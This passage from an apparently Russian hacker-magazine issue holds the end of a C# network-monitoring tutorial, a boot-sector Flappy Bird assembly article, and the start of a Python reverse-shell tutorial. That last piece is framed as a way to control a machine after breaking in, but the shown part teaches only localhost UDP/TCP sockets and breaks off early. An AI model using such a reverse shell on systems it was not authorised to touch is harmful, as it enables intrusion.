дальше мерить не име ет смысла. Запомним это до момента реализации.
  Поле router_rtt в представлении не нуждается, а вот зачем нужен mea‐
sure_id, когда есть measure_time, я сейчас объясню. Параметр measure_id
изменяется последовательно на единицу с момента первого изме рения пос‐
ле запуска. И в папке со снапшотами эти измерения выглядят как оче редь
файлов с именами, где отличается только пос ледняя цифра. В общем,
это нужно для облегчения ручной работы.
  Еще  нам  понадобятся  гло бальные  переменные  start_measure_id
для хранения ID пер вого результата и seq_id для порядкового номера изме‐
рения в очереди. Теперь объявим функцию проведения измерений. Вот ее
шаблон:


private static void DoMeasures() {
    System.Timers.Timer _timer = new System.Timers.Timer();
    _timer.AutoReset = true;
    _timer.Interval = MEASURE_DELAY;
    _timer.Elapsed += delegate {
    };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
    httpc = new HttpClient();
    TgNotify("nmon is now running", true);
    _timer.Start();
    while (true) Thread.Sleep(1000000);
}

Тут все просто: объявляем таймер, настраиваем его и запускаем. А еще нас‐
траиваем HTTPS — тот же Telegram, например, признает только HTTPS.
Далее поток уходит в спячку (строка 14). Основное действие разворачивает‐
ся в обработчике события сра батывания тай мера (делегат в 6–9‐й строках
этой врезки). Туда мы и будем писать в дальнейшем.
  Вначале инициализируем объект снапшота, записав в него значение mea‐
sure_id. Далее измеряем пинг до роутера и при отсутствии коннекта
выходим, сде лав соот ветству ющую запись в лог.


net_state snapshot = new net_state();
snapshot.inet_ok = true;
snapshot.measure_id = start_measure_id++;
snapshot.measure_time = DateTime.Now;
Ping ping = new Ping();
// First, check if router is available
var prr = ping.Send(ROUTER_IP, PING_TIMEOUT);
snapshot.router_rtt = prr.Status == IPStatus.Success ? (int)prr.
RoundtripTime : PING_TIMEOUT;
if (prr.Status != IPStatus.Success) {
    // Router is unreachable. Don’t waste resources
    snapshot.avg_rtts = new Dictionary<string, int>();
    snapshot.http_ok = false;
    snapshot.inet_ok = false;
    snapshot.packet_loss = 1;
    foreach (var ci in PING_HOSTS) {
        snapshot.avg_rtts.Add(ci, PING_TIMEOUT);
    }
    WriteLog("Router was unreachable.");
    SaveSnapshot(snapshot);
    return;
}

Тут самый большой интерес представляет блок обработки недос тупнос ти
роутера. Поясню: для корректной дальнейшей обра ботки в Excel все резуль‐
таты измерений дол жны быть заполнены, даже если мы их не проводили. Так
что заполним эти значения так, как будто измерение было, но все запросы
закончились по тайм‐ауту. Затем запишем лог и сохраним ущербное сос‐
тояние сети.
  Допустим, кон нект до роутера есть. Следующее действие — проверяем
работу HTTP. Причем для этого вовсе не обязательно использовать Web‐
Client. Мы просто подключимся к заданному хосту и порту по TCP. Если под‐
клю чение не сломается, значит, HTTP дос тупен и работает. Делается это все
следующим образом:


try {
    snapshot.http_ok = true;
    TcpClient tc = new TcpClient();
    tc.BeginConnect(HTTP_TEST_HOST, HTTP_TEST_PORT, null, null);
    Thread.Sleep(HTTP_TIMEOUT);
    if (!tc.Connected) {
        snapshot.http_ok = false;
        snapshot.inet_ok = false;
    }
} catch {
    snapshot.http_ok = false;
    snapshot.inet_ok = false;
}

Теперь осталось только замерить пинги. Количество возможных хос тов
для измерений ограничено только фантазией поль зователя, поэтому, чтобы
уложиться по времени в одну минуту, при дется задействовать несколько
потоков. Все они сделают замеры и сложат резуль тат в общий список, что,
конечно, с точки зрения реализации выглядит так себе, но сойдет для сель‐
ской местности мы же для себя пишем. В потоке у нас будет выполняться
простая функция, код которой представлен в лис тинге ниже.


static void PerformPingTest(Object arg) {
    String host = (String)arg;
    int pkts_lost_row = 0;
    int local_success = 0;
    long local_time = 0;
    Ping ping = new Ping();
    for (int i = 0; i < PING_COUNT; i++) {
        if (pkts_lost_row == 3) {
            // 3 lost packets in row
            // Handle here...
        }
        var result = ping.Send(host, PING_TIMEOUT);
        if (result.Status == IPStatus.Success){
            // Handle success here
        }
        switch (result.Status) { ... } // Handle different fails
    }
    measure_results.Add(host, (int)(local_time / (local_success == 0
? 1 : local_success)));
    exited_threads++;
    return;
}

Код сокращен, чтобы не тра тить мес то. Сна чала мы вытас киваем адрес хоста
в отдельную перемен ную. Почему нельзя было сра зу String? Потому что этот
метод передается как делегат в ParameterizedThreadStart, а он признает
только аргументы типа Object. Далее объ являем локальные переменные
для хранения промежуточного результата и подсчета packet loss. Отправляем
пинг, смотрим результат. Ничего слож ного. Перед любым выходом из фун‐
кции помечаем, что поток свою работу выполнил и результаты уже дос тупны.
Все!
  После отработки всех потоков главная функция дол жна забрать резуль‐
таты и занести их в объ ект. Затем посчитать packet loss и указать, в порядке
ли интернет, по мнению прог раммы. Напомню критерии установки флага in‐
et_ok в false:



      Если провален хотя бы один из тес тов: тест HTTP, средний пинг
      до всех хос тов больше 0,75 тайм‑аута, packet loss больше мак сималь-
      но допус тимого или роутер ушел в офлайн.

Так и запишем. Пол ный код этой процеду ры:


snapshot.avg_rtts = measure_results;
snapshot.packet_loss = (double)(pkt_sent ‐ success_pkts) / pkt_sent;
snapshot.inet_ok = !(
    snapshot.http_ok == false ||
    ((double)total_time / success_pkts >= 0.75 * PING_TIMEOUT) ||
    snapshot.packet_loss >= MAX_PKT_LOSS ||
    snapshot.router_rtt == PING_TIMEOUT);

Дело за малым: сох ранить снапшот и по необходимос ти отправить уведом‐
ление в «Телегу». Для этого я сделал функцию SaveSnapshot, которая только
генерирует имя файла, сериализует снапшот и записы вает его. Код не пред‐
ставляет никакого интереса, пос мотреть его можно в репозитории к статье.
Функция для отправки сооб щений в Telegram приведена ниже.


static async void TgNotify(String message, bool with_sound) {
    if (!TG_NOTIFY) return;
    Dictionary<String, String> req_data = new Dictionary<string,
string>();
    req_data.Add("chat_id", TG_CHAT_ID);
    req_data.Add("text", message);
    req_data.Add("disable_notification", (!with_sound).ToString().
ToLower());
    String sf = JsonConvert.SerializeObject(req_data);
    var result = await httpc.PostAsync($"https://api.telegram.org/bot
{TG_TOKEN}/sendMessage", new StringContent(sf, System.Text.Encoding.
UTF8, "application/json"));
}

Тут мы пользуемся HTTP Bot API «Телеграма», чтобы отправить сообщение.
Проверка  того,  вклю чены  ли  уведомления,  выполняется  тут  же.  Так
как Telegram уважает только JSON, пришлось еще раз применить Json.NET.
Остальное оче видно, только httpc — это System.Net.Http.HttpClient.
Вызов этой функции мы разместим пос ле про верки состояния сети в конце
обработчика таймера, а еще в функции логирования, но сообщения оттуда
будут приходить без звука.


        WWW

                      Код целиком на GitHub





                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

НИ ЕДИНОГО РАЗРЫВА
                      ПИШЕМ НА C# УТИЛИТУ
                       ДЛЯ МОНИТОРИНГА СЕТИ





ТЕСТИРУЕМ





                        Первый запуск

После сборки и запуска программа выг лядит как на скриншоте. Последуем ее
указанию и запустимся с параметром ‐m.
  Через пару минут видим, что в папке snapshots рядом с бинарником при‐
бавилось файлов.





                      Новенькие файлы

Некоторое время прототип программы проработал в фоне, после чего у меня
собрался солидный лог. Откро ем в Excel файл main.csv, лежащий в папке
с программой. Видим следующую картину.





                      Вывод в Excel

Теперь можно строить гра фики. Выбираем столбец D, затем Вставка → Диаг‐
рамма → График с накоплением. Регулируем шкалу и видим нечто похожее
на картинку ниже.





                       График среднего пинга

Естественно, можно пос троить график чего угодно, вот, например, график
потерь.





                      История packet loss

И еще немного скриншотов работы.





                Вывод логов в консоль работа ет





                        Уведомления Telegram


ПОСТРОЕНИЕ ТАБЛИЦЫ ПО СНАПШОТАМ
Все графики выше — это, конечно, хорошо, но что, если мы отключили запись
таблицы из соображений экономии ресурсов? У нас еще есть папка со снап‐
шотами в виде отдельных файлов JSON. Не руками же их разбирать в таб‐
лицу. Выход есть! Напишем парсер, а заодно сможем получить отчет за пос‐
ледние N дней. Расчехляй Visual Studio, соз давай новый проект, обзы вай его
как‐нибудь, добавляй в зависимости Json.NET — и прис тупим.
  Из основного проекта скопируем в этот структуру net_state.
   Дальше программа должна реализовывать следующий алгоритм.
 1. Выбрать все записи за определенный период и прочитать их.
 2. Пройти все прочитанные записи и выб рать, какие хосты там пингуются.
  Составить полный список таких хос тов.
 3. Составить новый заголовок CSV.
 4. Последовательно прой ти все записи от ста рых к новым и записать данные
   из этих записей в соответс тву ющие столбцы.
 5. Записать остатки в файл и выйти из программы.

Думаю, запросить у поль зователя параметры ты можешь и сам, да и опре‐
делить, какие файлы читать нуж но, тоже. Мы же остановимся на генерации
заголовка. Алгоритм прост как валенок:


Dictionary<String, int> host_ids = new Dictionary<string, int>();
int hid = 0;
foreach (var ci in snaps) {
    foreach (var ch in ci.avg_rtts.Keys) {
        if (host_ids.ContainsKey(ch)) continue;
        host_ids.Add(ch, hid++);
    }
}
// Build CSV header with this information
string csv_hdrs = "";
for (int i = 0; i < hid; i++) {
    csv_hdrs += $"RTT to {host_ids.Keys.ToArray()[i]}{delim}";
}
tgtcsv = tgtcsv.Replace("AHR", csv_hdrs);

Тут delim — это символ, разделяющий записи в выход ном CSV (по умол‐
чанию точка с запятой), snap — выб ранные на прошлом этапе записи,
а tgt_csv — содержимое выходного фай ла одной строкой.
  После формирования заголовка нуж но наполнить таблицу. Этим займется
следующий алгоритм:


foreach (var ninfo in snaps) {
    tgtcsv +=
        $"{ninfo.measure_time.ToShortDateString()} " +
        $"{ninfo.measure_time.ToShortTimeString()}{delim}" +
        $"{ninfo.inet_ok}{delim}{ninfo.http_ok}{delim}" +
        $"{ninfo.avg_rtts.Values.Average().ToString("N2")}{delim}" +
        ninfo.router_rtt.ToString() + delim +
        (ninfo.packet_loss * 100).ToString("N2") + delim +
        $"{ninfo.measure_id}{delim}{seq_id++}{delim}" +
        $"{ninfo.measure_time.ToShortTimeString()}{delim}{delim}";
    List<String> items = host_ids.Keys.ToList();
    foreach (var ci in items) {
        if (ninfo.avg_rtts.ContainsKey(ci)) {
            tgtcsv += ninfo.avg_rtts[ci];
        }
        tgtcsv += delim;
    }
    tgtcsv += $"{delim}\r\n";
}

Тут мы в строках 3–11 формируем первую часть строки таб лицы и прик‐
леиваем ее к самой таб лице. Затем проходим по найденным хостам и, если
в этом снапшоте есть измерение до это го хос та, записываем, иначе оставля‐
ем пустую клетку. После завершения текущей строки переходим к сле‐
дующей. Если достигнута пос ледняя стро ка, записываем все в выходной
файл и выходим.
  Я запустил программу на наборе из нес кольких результатов измерений,
получилось все правильно.





          Успешная работа, даже если часть данных отсутству ет





                  В Excel это выглядит так


ИТОГИ
Как видишь, написать простой анализатор сети, даже с уведомлениями
в любую точку мира, совсем несложно. Более того, его очень легко допилить
под свои нужды.
  В самом начале был упомянут замер скорос ти соеди нения, но я не стал
его реализовывать, так как точная динамика скорос ти в фоне не получится,
кто‐то обязательно будет использовать сеть в это время. А недостоверные
или сложно проверяемые замеры мы делать не будем. При желании ты
можешь сам  добавить  эту функцию,  благо  есть  готовая библиотека
для работы с сервисом Speedtest.net.
  Лю бые допол нения, предложения, как улучшить, и замечания можешь
написать в ком ментариях, а использование моего проекта в любых целях
ничем не ограничено. Удачных замеров!
КОДИНГ
  FLOPPY
     BIRD





                 ПИШЕМ
              НА АССЕМБЛЕРЕ
                 КЛОН ИГРЫ
        Антон Карев
   Эксперт по информационной      безопасности. Область          FLAPPY BIRD,
       профессиональных
   интересов — технологическая                  КОТОРЫЙ   разведка, аналитика в сфере
     ИБ и искусственный
            интеллект                 УМЕСТИТСЯ
        vedacoder@mail.ru
                В БУТСЕКТОР





Хочешь попрактиковаться в кодинге на ассемблере? Давай
вместе шаг за шагом создадим игру и запустим ее прямо
из загрузочного сектора тво его компьютера. Если ты дума‐
ешь, что 512 байт маловато для полноцен ной игры, не спеши
с выводами. К кон цу статьи ты сможешь сделать ее своими
руками!


Да, затолкать что‐то вра зумительное в 512 байт загрузочного сектора — та
еще задачка. Бутсекторная программа выполняется до запуска операци‐
онной системы, а значит, функции ОС ей недос тупны.
  Даже для такого, казалось бы, простого действия, как вывес ти чис ло
на экран, придется писать свою собственную подпрограмму. Кроме того,
забудь о высоком разрешении экра на, прос том и удобном доступе к GPU
и звуковой карте. А еще учти, что BIOS, выполняя бутсекторную программу,
смотрит на процессор тво его Ryzen или Core i9 как на при митивный 16‐бит‐
ный 8088.
  Вводные не очень‐то обна деживают! Но базовые функции BIOS у нас ник‐
то не отнимал. Мы можем выводить текст, рисовать крупноразмерные пик‐
сели, читать системный таймер, следить за клавиатурой. Этого впол не хватит
для несложной игрушки!
  На случай, если ты пропустил шумиху в 2013 году, поясню смысл игры.
Летящая слева направо по экра ну пта ха должна обле тать торчащие снизу
и сверху экрана трубы. Если игрок ничего не делает, она самопроизвольно
снижается. Нажатие на кнопку зас тавля ет ее взмахнуть крыльями и немного
подняться вверх. Секрет в том, чтобы соб людать нужный ритм и не врезаться.
Вот и вся игруха.
  А теперь возьмемся за реализацию!


ПОДГОТОВКА
Говорим компилятору, что наша программа 16‐битная, резервируем несколь‐
ко ячеек памяти под переменные, прыгаем на точку входа. Обрати внимание,
что мы здесь не создаем переменные, не выделя ем для них память, а просто
задаем мнемонику для ячеек памяти, которые уже существу ют.





Делаем еще несколько подготовитель ных телодвижений:
 • переходим в текстовый режим 25 × 80 и очищаем экран;
 • сбрасываем «флаг нап равления», чтобы строки обрабаты вались слева
   направо, а не наоборот (когда будем обращать ся к инструкциям вроде
   stosw);
 • сегментные  регистры нацеливаем  на  область опе ративной  памяти,
   которая отображена на видеопа мять. Так нам будет удобней отрисовывать
   игровое поле.





Инициализируем переменные. При этом стараемся сэкономить количес тво
используемых байтов. Когда мы сначала помеща ем нужное нам значение
в AX, а затем через stosw присваиваем его очередной переменной, получа‐
ется меньше байтов, чем ког да мы самостоятель но инициализируем каждую
переменную. Особен но когда присваиваем одинаковые значения — как два
нуля вначале.





Надо дать игроку успеть приноровиться к управлению, поэтому первую трубу
отрисовываем только пос ле 160‐го кадра. В next запишем чис ло 160 (0xA0)
и пишем не mov ax, 0x00A0, а mov al, 0xA0. Нам, конечно, важно, чтобы
в AH был ноль, но мы точно зна ем, что он и так уже там, поэтому тратить целый
байт на пов торное обнуление мы не будем.


(ПЕРЕ)ЗАПУСКАЕМ ИГРУ
Выводим название игры. Здесь каждый символ кодируется двумя байтами:
цвет и символ. Цвет задаем только один раз (0x0F во втором mov). Так мы
экономим еще несколь ко байтов.





При помощи подпрограммы MoveScene (ее мы напишем чуть позже) сдвигаем
игровое поле вле во на один столбец и на осво бодившемся месте рисуем
новый столбец. Посколь ку ширина экра на у нас 80 символов, мы вызываем
MoveScene 80 раз.





После того как вывели наз вание игры и нарисовали игровое поле, не начина‐
ем игру сразу, а ждем, пока игрок сори ентируется и нажмет какую‐нибудь
клавишу. Если к этому моменту в буфере клавиатуры зафиксированы какие‐то
нажатия, игнорируем их.





Каким образом игнориру ем? Вызываем первую функцию (0x01) прерывания
0x16, то есть смотрим, нет ли чего‐то в буфере клавиатуры. Обращаемся
к 0x01 в цикле, до тех пор пока не опус тошим буфер. А опус тошаем мы его
с помощью функции 0x00 того же прерыва ния. Опус тошив буфер, вызываем
0x00 еще раз и ждем, пока игрок клацнет по клавиатуре.


НАЧИНАЕМ ИГРОВОЙ ЦИКЛ: ВЫСЧИТЫВАЕМ КООРДИНАТЫ
ПТИЦЫ И РИСУЕМ ЕЕ
Мы подошли к главному игро вому циклу. Здесь настра иваем гравитацию, что‐
бы птичка снижалась самопроизвольно на каждой итерации цикла. Вдобавок,
чтобы играть было веселее, делаем так, что чем дольше игрок не нажимает
клавишу, тем сильнее гравитация тянет героя игры вниз.





Текущее значение гравитации помещаем в AL, чтобы рассчитать позицию
на экране. Учти, что bird — это дробное число (пять бит на целую часть, три
бита на дробную).
   Итоговый результат умножаем на 20. Так мы подс траиваемся под то, что
каждая  строка  на  монито ре  состоит  из  160  байт.  Затем  добав‐
ляем 32 к полученному числу, чтобы птичка не жалась к левой границе,
а летела на некотором расстоянии от нее.





То, что получилось, помещаем в DI инс трукцией xchg ax, di, поскольку AX
нельзя применять в качестве указателя. Обрати вни мание: мы здесь исполь‐
зуем xchg вместо mov не потому, что хотим сберечь значение, которое хранил
DI, а потому, что с mov код получился бы боль ше на целый байт!
   Счетчик рисуемых кадров Сadr нам нужен, чтобы высчитывать моменты,
когда надо рисовать «крыло вверх». Перед тем как рисовать кры ло (см. инс‐
трукции вроде mov word [di]), мы сначала считыва ем текущее содержимое
соответствующей ячейки памяти (см. инс трукции вро де mov al, [di]). Сме‐
щение 160 позволяет пос мотреть, что находится под птицей, а 2 — что сбоку
от нее. Ты же помнишь, что каждый символ у нас кодируется двумя байтами
(цвет и символ)?


ПРОДОЛЖАЕМ ИГРОВОЙ ЦИКЛ: СМОТРИМ, НЕТ ЛИ
СТОЛКНОВЕНИЙ
Проверяем, есть ли столкновение. Для это го достаточно одной‐единствен‐
ной инструкции cmp. Отводить на каж дое усло вие по отдельной cmp слишком
расточительно — много байтов израсходуем. Так что мы всю информацию
о возможных столкновениях сна чала суммируем в AL и только потом проверя‐
ем, не вмазалась ли птица куда‐то.





Если AL не равно 0x40, столкновение есть. Что это за мистика такая, как это
число дает нам такую ценную информа цию? Суть вот в чем. Если в анализи‐
руемых ячейках не было препятствий, зна чит, там хра нятся символы пробела.
А код пробела — 0x20; 0x40 — это сумма двух пробелов. Если результат отли‐
чен от 0x40, значит, птица во что‐то влетела. В таком случае пишем многоз‐
начительное BA][.





Если птица таки врезалась во что‐то, перезапускаем игру не сразу. Выжида‐
ем некоторое время, чтобы игрок успел осознать случившееся и погоревать.
По результатам психоло гичес кого тестирова ния и нескольких сеансов рас‐
становок по Хеллингеру мы выяс нили, какое время для этого необходимо.
100 промежутков, которые мы ждем перед отрисовкой каждого кадра (см.
следующий шаг), будет в самый раз.





Если игра идет своим чередом, то при помощи подпрограммы DelayBe‐
foreCadr  (ее мы напишем  чуть поз же), делаем небольшую задержку
перед следующим сдви гом экрана.





После каждого восьмого сдвига слегка увеличи ваем гравитацию, так играть
будет интересней. Затем стираем птицу с экрана, чтобы потом ее отрисовать
на следующей итерации игрового цикла. Только хвост не затираем, ради кра‐
сивой анимации. Затем дважды вызываем подпрограмму MoveScene — и пти‐
ца продвигается вперед еще на два шага.


ЗАВЕРШАЕМ ИГРОВОЙ ЦИКЛ: ПРОВЕРЯЕМ, НЕ ВСТРЕТИЛАСЬ ЛИ
НА ПУТИ ТРУБА
Если птичка встретила на своем пути трубу, плюсуем счетчик score и выводим
его обновленное значение на экран. Для этого переводим число в строковое
представ ление и рисуем его на экране. На каждую цифру по одной итерации
цикла.





Смотрим, не нажал ли игрок клавишу (ты еще помнишь, это первая функция
прерывания 0x16). Если игрок ничего не нажимал, переходим к следующей
итерации игрового цик ла. Но не нап рямую туда, а транзитом через @@ToJmp_‐
Main. Можно было бы и сразу прыг нуть на @@MainGameLoop, но тогда выйдет
на два байта больше, потому что эта метка далеко от текущей позиции кода.





Если кнопка таки нажата, смотрим какая (нулевая функция того же прерыва‐
ния). Escape — выходим из игры, либо в DOS, либо в никуда, если игра
запущена из загрузоч ного сектора. Ког да нажата не Escape, а какая‐то другая
клавиша, приподнимаем птицу и сбра сываем гра витацию в ноль (переменная
grav).
   Все, главный игровой цикл готов. Осталось написать две подпрограммы:
DelayBeforeCadr, которая делает задержку, и MoveScene, которая сдвигает
игровое поле влево на один символ.


DELAYBEFORECADR: ДЕЛАЕМ ЗАДЕРЖКУ
Задержку организуем при помощи системных часов, к которым обращаемся
через int 0x1A. Системные часы тика ют каж дые 55 мс — отсчитывают время,
прошедшее с момента включения компь юте ра. Функция 0x00 воз вращает
текущее количество тиков в CX:DX (четырехбай товое число).





Как работает DelayBeforeCadr? Считыва ем текущее количество тиков, сох‐
раняем его. И затем опять считыва ем его, но уже в цикле. Как только зна‐
чение меняется — выходим из цикла. Здесь же инкрементиру ем счетчик
cadr. Логичней, конеч но, было бы инкрементировать не здесь, а там, где эта
подпрограмма используется, но тогда этот инкремент нужно будет делать
при каждом обращении к DelayBeforeCadr. А это допол нительные байты,
которые у нас в дефиците.


MOVESCENE: ПЕРЕРИСОВЫВАЕМ ИГРОВОЕ ПОЛЕ
Сначала сдвигаем игровое поле влево на один символ. Сдвигаем все строки,
за исключением первой. Там у нас написа но наз вание игры и сколько очков
набрал игрок. Их двигать не надо.





Нацеливаем SI на первый символ первой стро ки (отсчитываем с нуля), а DI —
на нулевой символ первой строки. Зачем? Чтобы, когда будем делать movsw,
два байта из [SI] перемещались в [DI]. Помнишь ведь, что эти два байта —
код символа и цвет?
  Выполняем movsw по 79 раз для каждой стро ки и в результате сдвигаем
все строки экрана вле во.
  Рисуем подобие почвы (зеленая полоска) и затем дома. Чтобы было кра‐
сивее и динамичней, этажность домов (один или два) выбираем случайно.
Не то чтобы прямо случайно, но пример но случай но. За «случайным» числом
обращаемся к микросхеме системного таймера  (in  al,  0x40), которая
при каждом обращении выда ет новое число. Отталкиваясь от этого значения,
мы рисуем либо одноэтаж ный домик, либо дву хэтажный.





В псевдографике есть символ, который похож на стену с окошком, — 0x08.
Вот его мы и исполь зуем. Крышу рисуем символом треугольника (0x1E).


MOVESCENE: РИСУЕМ ТРУБУ
При каждом сдвиге игрового поля счет чик next уменьшаем на единицу. Когда
в счетчике оказывается число 3, 2, 1 или 0 — самое время рисовать трубу.
Когда счетчик равен трем, выбираем «случайное» положение для дырки в тру‐
бе: число от 4 до 11.





Отталкиваясь от того, какое число в next (3, 2, 1 или 0), выбираем, какой сим‐
вол псевдографики рисовать. Пра вый край отрисовываем редкой сеточкой
(0xB0), левый — плотной сеточкой (0xB1), середину — сплошным цветом
(0xDB).





Стол бик за столбиком отрисовываем всю тру бу. Начинаем с первой строки
справа (нулевую пропус каем) и рису ем верхнюю часть трубы (CX — счетчик
для hole). Затем рисуем тонкую линию под верхней частью трубы (0xC4).
Пропускаем шесть строчек — чтобы образовалась дос таточная для пролета
дырка. Рисуем толстую линию над ниж ней частью трубы (0xDF). И наконец,
нижнюю часть.
  Чем больше труб уже нарисо вано, тем меньше рас стояние делаем до сле‐
дующей. Но не меньше 17 символов. Если игрок ока зался уж очень провор‐
ным и трубы у него пошли совсем близ ко, то не даем им рисоваться вплотную
друг к дружке: достигнув зна чения 17, счетчик next больше не уменьшается.





СИГНАТУРА ЗАГРУЗОЧНОГО СЕКТОРА
Загрузочный сектор в машинах IBM PC хранит 510 байт. Два недостающих
байта от 512 зарезервирова ны под сигнатуру: 0x55, 0xAA. Считывая заг‐
рузочный сектор, BIOS ищет эту сигнатуру в его двух последних байтах. Ее
наличие означает, что в загрузочном секторе записана программа, которую
надо выполнить.



На древних досов ских дисках эта программа парсила файловую систему FAT,
чтобы найти там два файла: io.sys и msdos.sys. Затем программа загружала
io.sys, который, в свою очередь, загружал msdos.sys.
  В бутсекторе очень мало свободного прос транства и набор доступных
функций ограничен, поэто му сложно при думать для него какое‐то другое
дело, кроме загрузки системы. Однако у нас с тобой получилось засунуть
туда нечто куда более интересное!
  И напоследок пара организационных моментов. Для компиляции прог‐
раммы лучше исполь зовать nasm: nasm ‐f bin flobird.asm ‐o flobird.
com. А если боишься редактировать бутсектор, можешь играть в Floppy Bird
через эмулятор DOS — например, DOSBox. Но только учти, что тот трюк,
который мы предприняли для генера ции случайных чисел, не работает в эму‐
ляторе и поэтому «случайная» этажность домов получается ну совсем не слу‐
чайной.
 КОДИНГ





     Ghoustchat
aio02012003@gmail.com



REVERSE SHELL
НА PYTHON

ОСВАИВАЕМ НАВЫКИ
РАБОТЫ С СЕТЬЮ НА PYTHON
НА ПРИМЕРЕ ОБРАТНОГО ШЕЛЛА




 В этой статье мы разберемся, как при помощи Python
 передавать сообщения между двумя компьюте рами, под‐
 ключенными к сети. Эта задача часто встре чается не только
 при разработке приложений, но и при пентесте или участии
 в CTF. Проникнув на чужую машину, мы как‐то должны
 передавать ей команды. Именно для этого нужен reverse
 shell, или «обратный шелл», который мы и напишем.


 Существует два низкоуровневых протокола, по которым передаются данные
 в компьютерных сетях, — это UDP (User Datagram Protocol) и TCP (Transmis‐
 sion Control Protocol). Работа с ними слегка раз личается, поэтому рассмот‐
 рим оба.
   Про токол UDP предназначен для переда чи пакетов от одного узла к дру‐
 гому без гарантии доставки. Пакет данных обычно состоит из двух частей.
 В одной — управляющая информация, в том чис ле данные отправителя
 и получателя, а также коды ошибок. В другой — пользовательская информа‐
 ция, то есть сообщение, которое переда ется.
   Важно здесь то, что UDP не гарантирует доставку пакета (правильнее
 говоря, датаграммы) указанному узлу, так как меж ду отправителем и получа‐
 телем не установлен канал свя зи. Ошиб ки и потери пакетов в сетях случаются
 сплошь и рядом, и это стоит учитывать (или в определенных случаях, наобо‐
 рот, не стоит).
   Про токол TCP тоже дос тавляет сооб щения, но при этом гарантирует, что
 пакет долетит до получателя целым и невредимым.


 ПЕРЕХОДИМ К ПРАКТИКЕ
 Писать код мы будем на современном Python 3. Вмес те с Python поставля‐
 ется набор стан дартных библиотек, из которого нам потребуется модуль
 socket. Подклю чаем его.


 import socket

 Дальше мы договоримся, что у нас есть сервер и клиент, где клиентом обыч‐
 но будет наш компьютер, а сервером — удаленный. В реальности все
 это условности, и речь может идти о любых двух компьюте рах (в том числе
 виртуальных машинах) или даже просто двух про цес сах, запущенных локаль‐
 но. Важно только то, что код по разные стороны будет раз ным.
   На каждой из сторон первым делом соз даем экземпляр класса socket
 и устанавливаем для него две константы (параметры).


 ИСПОЛЬЗУЕМ UDP
 Сначала создадим место для обмена данными.


 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

 Мы создали объект s, который является экземпляром класса socket. Для это‐
 го мы вызвали метод из модуля socket с именем socket и передали ему два
 параметра — AF_INET и SOCK_DGRAMM. AF_INET означает, что используется
 IP‐протокол четвертой версии. При желании можно использовать  IPv6.
 Во втором параметре для наших целей мы можем указать одну из двух кон‐
 стант: SOCK_DGRAMM или SOCK_STREAM. Первая означает, что будет исполь‐
 зоваться протокол UDP. Вто рая — TCP.


 Сто рона сервера
 Далее код различается для стороны сервера и клиента. Рассмотрим сначала
 сторону сервера.


 s.bind(('127.0.0.1', 8888))
 result = s.recv(1024)
 print('Message:', result.decode('utf‐8'))
 s.close()

 Здесь s.bind(('127.0.0.1', 8888)) означает, что мы резервируем на сер‐
 вере (то есть на нашей же машине) адрес 127.0.0.1 и порт 8888. На нем мы
 будем слушать и принимать пакеты информации. Здесь стоят двойные скоб‐
 ки, так как методу bind() передается кортеж данных — в нашем случае сос‐
 тоящий из строки с адресом и номера порта.


              INFO

                      Резервировать можно только свободные порты.
                      Например,  если  на  порте  80  уже  работа ет
                        веб‐сервер, то он будет нам мешать.


 Далее метод recv() объекта s прослушивает указанный нами порт (8888)
 и получает дан ные по одному килобайту (поэтому мы задаем размер
 буфера 1024 байта). Если на него присыла ют датаграмму, то метод считывает
 указанное количество байтов и они попадают в переменную result.
   Далее идет всем зна комая функция print(), в которой мы выводим сооб‐
 щение Message: и декодированный текст. Пос кольку данные в result —
 это текст в кодировке UTF‐8, мы должны интерпретировать его, вызвав метод
 decode('utf‐8').
   Ну и наконец, вызов метода close() необ ходим, чтобы остановить прос‐
 лушивание 8888‐го порта и осво бодить его.
    Таким образом, сторона сервера имеет следующий вид:


 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.bind(('127.0.0.1', 8888))
 result = s.recv(1024)
 print('Message:', result.decode('utf‐8'))
 s.close()


 Сто рона клиента
 Здесь все гораздо проще. Для отправки датаграммы мы используем метод
 класса socket (точнее, нашего экземпляра s) под названием .sendto():


 s.sendto(b'<Your message>', ('127.0.0.1', 8888))

 У метода есть два параметра. Первый — сообщение, которое ты отправ‐
 ляешь. Буква b перед текстом нужна, чтобы преобразовать символы текста
 в последовательность байтов. Второй параметр — кортеж, где указаны IP
 машины‐получателя и порт, который принимает датаграмму.
    Таким образом, сторона клиента будет выглядеть примерно так:


 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.sendto(b'<Your message>', ('127.0.0.1', 8888))


 Тестиру ем
 Для тестирования открываем две консоли, одна у нас будет работать сер‐
 вером, другая — клиентом. В каж дой запус каем соответству ющую прог‐
 рамму.





                   Вывод на сто роне сервера

 На стороне клиента мы ничего увидеть не должны, и это логично, потому что
 мы ничего и не просили выводить.
   Для теста мы передавали сообщение от одного порта дру гому порту
 на нашей же машине, но если запустить эти скрип ты на раз ных компьютерах
 и на стороне клиента ука зать правильный IP, то все будет работать точно так
 же.


 ИСПОЛЬЗУЕМ TCP
 Пришло вре мя познакомиться с TCP. Точно так же создаем класс s, но в
 качестве второго параметра будем использовать константу SOCK_STREAM.


 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


 Сто рона сервера
 Снова резервируем порт, на котором будем при нимать пакеты:


 s.bind(('127.0.0.1', 8888))

 Дальше появ ляется незнакомый нам ранее метод listen(). С его помощью
 мы устанавливаем некую очередь для подклю ченных клиентов. Например,
 с параметром .listen(5) мы соз даем ограничение на пять подключенных
 и ожидающих ответа клиентов.
   Делаем бесконечный цикл, в котором будем обрабаты вать запросы
 от каждого нового клиента, находя щего ся в очереди.


 while 1:
   try:
     client, addr = s.accept()
   except KeyboardInterrupt:
     s.close()
     break
   else:
     result = client.recv(1024)
     print('Message:', result.decode('utf‐8'))

 Страшновато? Начнем по порядку. Сна чала мы соз даем обработчик исклю‐
 чения KeyboardInterrupt (оста новка работы программы с клавиатуры), что‐
 бы сервер работал бесконечно, пока мы что‐нибудь не нажмем.
   Метод accept() возвра щает пару значений, которую мы помещаем в две
 переменные: в addr будут содержаться данные о том, кто был отправителем,
 а client станет экземпляром класса socket. То есть мы создали новое под‐
 клю чение.
    Теперь посмотрим вот на эти три строчки:


 except KeyboardInterrupt:
   s.close()
   break

